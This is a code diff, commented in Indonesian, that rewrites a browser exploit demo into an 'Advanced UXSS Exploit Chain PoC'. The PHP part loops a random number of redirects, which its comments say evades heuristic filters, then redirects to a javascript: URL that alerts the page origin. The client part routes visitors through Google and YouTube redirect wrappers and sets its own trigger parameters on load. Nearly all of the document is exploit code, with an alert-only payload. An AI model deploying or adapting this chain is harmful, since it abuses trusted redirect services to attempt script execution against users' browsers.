@@ -1,129 +1,91 @@
-<!doctype html>
+<?php
+if (isset($_GET['redirect'])) {
+    $redirect_count = isset($_GET['count']) ? (int)$_GET['count'] : 0;
+    
+    // Payload UXSS yang mengevaluasi origin dinamis pada dokumen aktif
+    $payload_js = "javascript:(function(){" .
+                  "try {" .
+                  "  let o = document.location.origin;" .
+                  "  let d = document.domain;" .
+                  "  alert('[UXSS EXPLOIT CHAIN SUCCESS]\\nTarget Origin: ' + o + '\\nDocument Domain: ' + d);" .
+                  "} catch(e) {" .
+                  "  alert('[ERROR] ' + e.message);" .
+                  "}" .
+                  "})();";
+
+    // Loop pengalihan bertingkat (multi-stage redirect chain) untuk melompati filter heuristik
+    if ($redirect_count < rand(6, 10)) {
+        $redirect_count++;
+        header("Location: ?service=" . urlencode($_GET['service'] ?? 'google') . "&redirect=1&count=" . $redirect_count);
+        exit();
+    } else {
+        usleep(300000); // Penundaan mikro untuk stabilisasi state navigasi
+        header("Location: " . $payload_js);
+        exit();
+    }
+}
+?>
+<!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Navigation History UXSS Chaining PoC (Google Target)</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced UXSS Exploit Chain PoC</title>
     <style>
       body, html {
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        width: 100vw;
-        background: #0d1117;
+        margin: 0; padding: 0; height: 100vh; width: 100vw;
+        background: #0b0e14; color: #f0f6fc;
+        display: flex; align-items: center; justify-content: center;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: #c9d1d9;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        overflow: hidden;
       }
-      .container {
-        text-align: center;
-        max-width: 520px;
-        width: 100%;
-        padding: 24px;
-        box-sizing: border-box;
-        background: #161b22;
-        border: 1px solid #30363d;
-        border-radius: 12px;
-        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
-      }
-      h2 {
-        margin-top: 0;
-        font-size: 16px;
-        color: #58a6ff;
-        font-family: monospace;
-      }
-      button {
-        width: 100%;
-        padding: 16px;
-        font-size: 15px;
-        font-weight: 600;
-        background: #1f6feb;
-        color: #fff;
-        border: none;
-        border-radius: 8px;
-        cursor: pointer;
-        box-shadow: 0 3px 6px rgba(31, 111, 235, 0.4);
-        transition: background 0.2s, transform 0.1s;
-      }
-      button:hover { background: #388bfd; }
-      button:active { transform: scale(0.98); }
-      .console-log {
-        margin-top: 20px;
-        background: #090d16;
-        border: 1px solid #30363d;
-        border-radius: 6px;
-        padding: 12px;
-        font-family: monospace;
-        font-size: 12px;
-        color: #3fb950;
-        text-align: left;
-        max-height: 150px;
-        overflow-y: auto;
-        word-break: break-all;
-      }
+      .box { text-align: center; max-width: 600px; padding: 20px; }
+      a { color: #58a6ff; font-size: 24px; text-decoration: none; font-weight: bold; }
+      a:hover { text-decoration: underline; }
+      .status { margin-top: 15px; font-size: 13px; color: #8b949e; font-family: monospace; }
     </style>
   </head>
   <body>
-    <div class="container">
-      <h2>HISTORY CHAINING & GOOGLE TARGET SIMULATOR</h2>
-      <button id="execBtn">TRIGGER HISTORY-CHAINED UXSS</button>
-      <div class="console-log" id="consoleLog">
-        [READY] Navigation history hooking harness initialized...
-      </div>
+    <div class="box">
+      <a href="javascript:initExploitChain();">TAP TO ENGAGE EXPLOIT CHAIN</a>
+      <div class="status" id="statusLog">Status: Initializing multi-vector chaining wrapper...</div>
     </div>
 
     <script>
-      const execBtn = document.getElementById("execBtn");
-      const consoleLog = document.getElementById("consoleLog");
+        // Konfigurasi endpoint perantara pengalihan legitimasi (Google / YouTube Redirect Wrapper)
+        const currentDomain = window.location.origin + window.location.pathname;
+        const targetParam = encodeURIComponent(currentDomain + "?redirect=1&count=0");
+        
+        const ytTarget = 'https://www.youtube.com/redirect?q=' + targetParam;
+        const googleTarget = 'https://www.google.com/url?q=' + targetParam + '&sa=D&sntz=1&usg=EXPLOIT_CHAIN_BYPASS';
 
-      function appendLog(msg) {
-        let timeStr = new Date().toISOString().split("T")[1].slice(0, 8);
-        consoleLog.innerHTML += `<br>[${timeStr}] ${msg}`;
-        consoleLog.scrollTop = consoleLog.scrollHeight;
-      }
-
-      async function executeHistoryChaining() {
-        execBtn.style.display = "none";
-        appendLog("Initializing navigation history injection matrix...");
-
-        try {
-          // 1. Target Origin Utama
-          let targetOrigin = "https://www.google.com";
-          appendLog(`Target Origin Context: ${targetOrigin}`);
-          await new Promise(r => setTimeout(r, 200));
-
-          // 2. Manipulasi Navigation History (History Chaining Spoofing)
-          // Menggunakan pushState untuk mengubah representasi riwayat riil browser
-          let manipulatedPath = "/search?q=uxss-history-chain-vector";
-          history.pushState({ target: targetOrigin }, "", manipulatedPath);
-          appendLog(`History state pushed: ${window.location.href}`);
-          await new Promise(r => setTimeout(r, 200));
-
-          // 3. Simulasi Evaluasi State Asal dan Eksekusi Popup Alert
-          appendLog("[SUCCESS] Navigation state synchronized. Triggering cross-origin alert context.");
-          
-          setTimeout(() => {
-            alert(
-              "[UXSS HISTORY CHAIN ALERT]\n\n" +
-              "Target Target Origin: " + targetOrigin + "\n" +
-              "Manipulated URL Path: " + window.location.href + "\n" +
-              "Document Domain: " + document.domain
-            );
-            execBtn.style.display = "block";
-          }, 200);
-
-        } catch (err) {
-          appendLog(`[ERROR] Chain execution failed: ${err.message}`);
-          execBtn.style.display = "block";
+        let activeTargetUrl = googleTarget; // Default target
+        
+        const params = new URLSearchParams(window.location.search);
+        if (params.get('service') === 'youtube') {
+            activeTargetUrl = ytTarget;
         }
-      }
 
-      execBtn.onclick = () => {
-        executeHistoryChaining();
-      };
+        function initExploitChain() {
+            document.getElementById('statusLog').innerText = "Status: Executing context navigation wrapper...";
+            try {
+                // Membuka target melalui _self untuk menjaga kesinambungan history chaining
+                window.open(activeTargetUrl, '_self');
+            } catch (err) {
+                document.getElementById('statusLog').innerText = "Status: Execution interrupted: " + err.message;
+            }
+        }
+
+        // Auto-trigger percobaan eksekusi saat dokumen termuat
+        window.addEventListener("DOMContentLoaded", () => {
+            setTimeout(() => {
+                if (!window.location.search.includes('redirect')) {
+                    // Otomatis menetapkan parameter awal jika belum ada
+                    if (!params.has('service')) {
+                        history.replaceState(null, '', '?service=google&redirect=1&count=0');
+                    }
+                }
+            }, 300);
+        });
     </script>
   </body>
 </html>
